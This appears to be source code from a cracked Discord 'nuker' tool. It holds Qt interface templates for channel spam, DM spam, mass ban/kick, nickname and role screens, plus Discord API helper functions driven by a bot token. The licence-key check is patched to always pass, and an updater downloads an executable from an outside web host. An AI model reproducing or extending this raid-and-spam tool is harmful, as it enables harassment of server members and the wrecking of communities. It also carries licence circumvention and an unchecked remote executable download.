      <y>150</y>
      <width>331</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
    <property name="placeholderText">
     <string>Token</string>
    </property>
   </widget>
   <widget class="QLabel" name="InsertTokenLabel">
    <property name="geometry">
     <rect>
      <x>205</x>
      <y>110</y>
      <width>321</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff;</string>
    </property>
    <property name="text">
     <string>Insert Your Token</string>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
   </widget>
   <widget class="QPushButton" name="InfoButton">
    <property name="geometry">
     <rect>
      <x>640</x>
      <y>20</y>
      <width>40</width>
      <height>40</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
      <weight>75</weight>
      <bold>true</bold>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>i</string>
    </property>
   </widget>
   <widget class="QLabel" name="Info">
    <property name="geometry">
     <rect>
      <x>450</x>
      <y>-70</y>
      <width>181</width>
      <height>40</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff;</string>
    </property>
    <property name="text">
     <string>Insert token and host your bot!</string>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
   </widget>
   <widget class="QPushButton" name="TutorialButton">
    <property name="geometry">
     <rect>
      <x>450</x>
      <y>230</y>
      <width>81</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Tutorial</string>
    </property>
   </widget>
   <widget class="QPushButton" name="DDPButton">
    <property name="geometry">
     <rect>
      <x>200</x>
      <y>230</y>
      <width>241</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Discord developer portal</string>
    </property>
   </widget>
   <widget class="QLabel" name="Title">
    <property name="geometry">
     <rect>
      <x>220</x>
      <y>20</y>
      <width>281</width>
      <height>40</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>20</pointsize>
      <weight>75</weight>
      <italic>true</italic>
      <bold>true</bold>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #660708;</string>
    </property>
    <property name="text">
     <string>ShibaOnTop</string>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
   </widget>
   <widget class="QComboBox" name="TokensList">
    <property name="geometry">
     <rect>
      <x>200</x>
      <y>320</y>
      <width>271</width>
      <height>31</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
   </widget>
   <widget class="QLabel" name="InsertTokenLabel_3">
    <property name="geometry">
     <rect>
      <x>230</x>
      <y>300</y>
      <width>271</width>
      <height>20</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>8</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff;</string>
    </property>
    <property name="text">
     <string>Recent tokens</string>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
   </widget>
   <widget class="QPushButton" name="InsertToken">
    <property name="geometry">
     <rect>
      <x>480</x>
      <y>320</y>
      <width>51</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>OK</string>
    </property>
   </widget>
  </widget>
 </widget>
 <resources/>
 <connections/>
</ui>"""


ServerInfoTemplate = """<?xml version="1.0" encoding="UTF-8"?>
<ui version="4.0">
 <class>MainWindow</class>
 <widget class="QMainWindow" name="MainWindow">
  <property name="geometry">
   <rect>
    <x>0</x>
    <y>0</y>
    <width>697</width>
    <height>360</height>
   </rect>
  </property>
  <property name="font">
   <font>
    <family>Arial</family>
    <pointsize>12</pointsize>
   </font>
  </property>
  <property name="windowTitle">
   <string>MainWindow</string>
  </property>
  <property name="styleSheet">
   <string notr="true">background-color:  #0B090A;
font-family: &quot;Arial&quot;;</string>
  </property>
  <widget class="QWidget" name="centralwidget">
   <widget class="QLabel" name="infoLabel">
    <property name="geometry">
     <rect>
      <x>190</x>
      <y>10</y>
      <width>420</width>
      <height>40</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>16</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff;</string>
    </property>
    <property name="text">
     <string>Server info</string>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
   </widget>
   <widget class="QLabel" name="label">
    <property name="geometry">
     <rect>
      <x>0</x>
      <y>0</y>
      <width>141</width>
      <height>381</height>
     </rect>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;</string>
    </property>
    <property name="text">
     <string/>
    </property>
    <property name="indent">
     <number>-1</number>
    </property>
   </widget>
   <widget class="QLabel" name="ServerName">
    <property name="geometry">
     <rect>
      <x>150</x>
      <y>70</y>
      <width>541</width>
      <height>21</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff;</string>
    </property>
    <property name="text">
     <string>Server name: </string>
    </property>
   </widget>
   <widget class="QLabel" name="TotalMembers">
    <property name="geometry">
     <rect>
      <x>150</x>
      <y>180</y>
      <width>241</width>
      <height>21</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff;</string>
    </property>
    <property name="text">
     <string>Total members:</string>
    </property>
   </widget>
   <widget class="QLabel" name="TextChannels">
    <property name="geometry">
     <rect>
      <x>150</x>
      <y>220</y>
      <width>241</width>
      <height>21</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff;</string>
    </property>
    <property name="text">
     <string>Text channels:</string>
    </property>
   </widget>
   <widget class="QLabel" name="OwnerName">
    <property name="geometry">
     <rect>
      <x>150</x>
      <y>110</y>
      <width>541</width>
      <height>21</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff;</string>
    </property>
    <property name="text">
     <string>Owner name: </string>
    </property>
   </widget>
   <widget class="QLabel" name="TotalRoles">
    <property name="geometry">
     <rect>
      <x>420</x>
      <y>180</y>
      <width>241</width>
      <height>21</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff;</string>
    </property>
    <property name="text">
     <string>Total roles: </string>
    </property>
   </widget>
   <widget class="QLabel" name="VoiceChannels">
    <property name="geometry">
     <rect>
      <x>420</x>
      <y>220</y>
      <width>241</width>
      <height>21</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff;</string>
    </property>
    <property name="text">
     <string>Voice channels:</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuRoles">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>140</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Roles</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuChannels">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>110</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Channels</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuServerInfo">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>80</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #660708;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Server info</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuBanKick">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>170</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Ban/Kick</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuBotInfo">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>50</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Bot info</string>
    </property>
   </widget>
   <widget class="QLabel" name="label_2">
    <property name="geometry">
     <rect>
      <x>0</x>
      <y>10</y>
      <width>131</width>
      <height>31</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>14</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
color: #ffffff;</string>
    </property>
    <property name="text">
     <string>ShibaOnTop</string>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuCredits">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>320</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Credits</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuNicknames">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>260</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Nicknames</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuDMSpam">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>230</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>DM Spam</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuSpam">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>200</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Channel Spam</string>
    </property>
   </widget>
  </widget>
 </widget>
 <resources/>
 <connections/>
</ui>"""

SpamTemplate = """<?xml version="1.0" encoding="UTF-8"?>
<ui version="4.0">
 <class>MainWindow</class>
 <widget class="QMainWindow" name="MainWindow">
  <property name="geometry">
   <rect>
    <x>0</x>
    <y>0</y>
    <width>700</width>
    <height>360</height>
   </rect>
  </property>
  <property name="font">
   <font>
    <family>Arial</family>
    <pointsize>12</pointsize>
   </font>
  </property>
  <property name="windowTitle">
   <string>MainWindow</string>
  </property>
  <property name="styleSheet">
   <string notr="true">background-color:  #0B090A;
font-family: &quot;Arial&quot;;</string>
  </property>
  <widget class="QWidget" name="centralwidget">
   <widget class="QLabel" name="InsertTokenLabel_2">
    <property name="geometry">
     <rect>
      <x>190</x>
      <y>10</y>
      <width>420</width>
      <height>40</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>16</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff;</string>
    </property>
    <property name="text">
     <string>Channel Spam</string>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
   </widget>
   <widget class="QLabel" name="label">
    <property name="geometry">
     <rect>
      <x>0</x>
      <y>0</y>
      <width>141</width>
      <height>381</height>
     </rect>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;</string>
    </property>
    <property name="text">
     <string/>
    </property>
    <property name="indent">
     <number>-1</number>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuRoles">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>140</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Roles</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuSpam">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>200</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #660708;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Channel Spam</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuChannels">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>110</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Channels</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuServerInfo">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>80</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Server info</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuBanKick">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>170</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Ban/Kick</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuBotInfo">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>50</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Bot info</string>
    </property>
   </widget>
   <widget class="QLabel" name="label_2">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>10</y>
      <width>121</width>
      <height>31</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>14</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
color: #ffffff;</string>
    </property>
    <property name="text">
     <string>ShibaOnTop</string>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuCredits">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>320</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Credits</string>
    </property>
   </widget>
   <widget class="QLabel" name="BotName_4">
    <property name="geometry">
     <rect>
      <x>170</x>
      <y>50</y>
      <width>131</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff;</string>
    </property>
    <property name="text">
     <string>Channel to spam:</string>
    </property>
   </widget>
   <widget class="QComboBox" name="ChannelList">
    <property name="geometry">
     <rect>
      <x>280</x>
      <y>50</y>
      <width>261</width>
      <height>31</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
   </widget>
   <widget class="QPushButton" name="ChannelSpammingButton">
    <property name="geometry">
     <rect>
      <x>170</x>
      <y>200</y>
      <width>161</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Start spamming</string>
    </property>
   </widget>
   <widget class="QCheckBox" name="AllChannel">
    <property name="geometry">
     <rect>
      <x>560</x>
      <y>50</y>
      <width>41</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff;
border-radius: 8px;</string>
    </property>
    <property name="text">
     <string>All</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuNicknames">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>260</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Nicknames</string>
    </property>
   </widget>
   <widget class="QPlainTextEdit" name="plainTextEdit">
    <property name="geometry">
     <rect>
      <x>170</x>
      <y>90</y>
      <width>461</width>
      <height>101</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="placeholderText">
     <string>Text</string>
    </property>
   </widget>
   <widget class="QLabel" name="InsertTokenLabel_3">
    <property name="geometry">
     <rect>
      <x>510</x>
      <y>200</y>
      <width>61</width>
      <height>31</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff;</string>
    </property>
    <property name="text">
     <string>Timeout: </string>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
   </widget>
   <widget class="QDoubleSpinBox" name="doubleSpinBox">
    <property name="geometry">
     <rect>
      <x>570</x>
      <y>200</y>
      <width>61</width>
      <height>31</height>
     </rect>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="minimum">
     <double>0.050000000000000</double>
    </property>
    <property name="value">
     <double>0.200000000000000</double>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuDMSpam">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>230</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>DM Spam</string>
    </property>
   </widget>
   <widget class="QPushButton" name="ChannelStopSpammingButton">
    <property name="geometry">
     <rect>
      <x>340</x>
      <y>200</y>
      <width>161</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Stop spamming</string>
    </property>
   </widget>
   <widget class="QListWidget" name="Log">
    <property name="geometry">
     <rect>
      <x>170</x>
      <y>241</y>
      <width>461</width>
      <height>111</height>
     </rect>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
   </widget>
  </widget>
 </widget>
 <resources/>
 <connections/>
</ui>"""



if not "DemonNuker - Full Cracked by Cabbo" in os.listdir(os.getenv("localappdata")):
    os.mkdir(f"{os.getenv('localappdata')}/DemonNuker - Full Cracked by Cabbo/")
    open(f"{os.getenv('localappdata')}/DemonNuker - Full Cracked by Cabbo/recent_tokens.data", "w").close()
    open(f"{os.getenv('localappdata')}/DemonNuker - Full Cracked by Cabbo/key.data", "w").close()
if not "icon.png" in os.listdir(f"{os.getenv('localappdata')}/DemonNuker - Full Cracked by Cabbo"):
    with open(f"{os.getenv('localappdata')}/DemonNuker - Full Cracked by Cabbo/icon.png", "wb") as ico:
        ico.write(requests.get("https://cdn.discordapp.com/attachments/907996029725585469/908003596572950538/icon.png").content)

token = ""
bot_infos = None
bot_guilds = {}
selected_guild = None

stop_channel_generator = False
stop_role_generator = False
stop_channel_spamming = False
stop_dm_spamming = False
stop_change_nicknames = False

ChannelsOBJ = None
RolesOBJ = None
BanKickOBJ = None
file_name = None

API_URL = "https://discord.com/api/v9"

def new_version_downloader(self, file_name):
    with open(file_name, "wb") as f:
        print("Downloading %s" % file_name)
        response = requests.get("http://demon-team.web.app/api/DemonNuker/Demon_Nuker.exe", stream=True)
        total_length = response.headers.get('content-length')

        if total_length is None: # no content length header
            f.write(response.content)
        else:
            dl = 0
            total_length = int(total_length)
            for data in response.iter_content(chunk_size=2048):
                dl += len(data)
                f.write(data)
                done = int(100 / total_length * dl)
                self.progress.setValue(done)
#    NewVersion.update_text()
    

def random_name():
    name = ""
    for i in range(15): name += random.choice(string.ascii_letters)
    return name

def checkkey(key):

    decrypt = {
        "1": "q",
        "2": "w",
        "3": "e",
        "4": "r",
        "5": "t",
        "6": "y",
        "7": "u",
        "8": "i",
        "9": "o",
        "0": "p",
    }

    try:
        keyc = ""
        for char in key:
            keyc += decrypt[char]
        print(keyc)
    except:
        return True

    keys = requests.get("https://demon-team.web.app/api/DemonNuker/keys").text.splitlines()
    if f"{keyc}:{os.getlogin()}" in keys:
        return True
    return True


def ServerInfoYes(self):
    guild_id = bot_guilds[selected_guild.currentText()]
    server_infos = get_server_infos(token, guild_id)
    server_channels = get_guild_channels(token, guild_id)
    server_members = get_guild_members(token, guild_id)

    text_channels = 0
    voice_channels = 0
    for channel in server_channels:
        if channel["type"] == 0:
            text_channels += 1
        elif channel["type"] == 2:
            voice_channels += 1

    owner = get_user_infos(token, server_infos["owner_id"])
    self.ServerName.setText("Server name: " + server_infos["name"])
    self.OwnerName.setText("Owner name: " + owner["username"] + "#" + owner["discriminator"])
    self.TotalRoles.setText("Total roles: " + str(len(server_infos['roles'])))
    self.TextChannels.setText("Text channels: " + str(text_channels))
    self.VoiceChannels.setText("Voice channels: " + str(voice_channels))
    self.TotalMembers.setText("Total members: " + str(len(server_members)))
    self.infoLabel.setText("Server info")

def crypt(text):
    message_bytes = text.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    return base64_bytes.decode('ascii')

def decrypt(text):
    base64_bytes = text.encode('ascii')
    message_bytes = base64.b64decode(base64_bytes)
    return message_bytes.decode('ascii')

# API FUNCTIONS
def change_nickname(token : str, guild_id : str, member_id : str, nick : str):
    return json.loads(requests.patch(f"https://discord.com/api/v9/guilds/{guild_id}/members/{member_id}", headers={"content-type": "application/json", "Authorization": f"Bot {token}"}, data=json.dumps({"nick": nick})).text)

def get_server_infos(token : str, guild_id : str):
    return json.loads(requests.get(f"{API_URL}/guilds/{guild_id}", headers={"Authorization": f"Bot {token}"}).text)

def get_user_infos(token : str, user_id : str):
    return json.loads(requests.get(f"{API_URL}/users/{user_id}", headers={"Authorization": f"Bot {token}"}).text)

def get_guild_members(token : str, guild_id : str):
    return json.loads(requests.get(f"{API_URL}/guilds/{guild_id}/members?limit=1000", headers={"Authorization": f"Bot {token}"}).text)

def get_guilds_list(token : str):
    return json.loads(requests.get(f"{API_URL}/users/@me/guilds", headers={"Authorization": f"Bot {token}"}).text)

def get_guild_channels(token : str, guild_id : str):
    return json.loads(requests.get(f"{API_URL}/guilds/{guild_id}/channels", headers={"Authorization": f"Bot {token}"}).text)

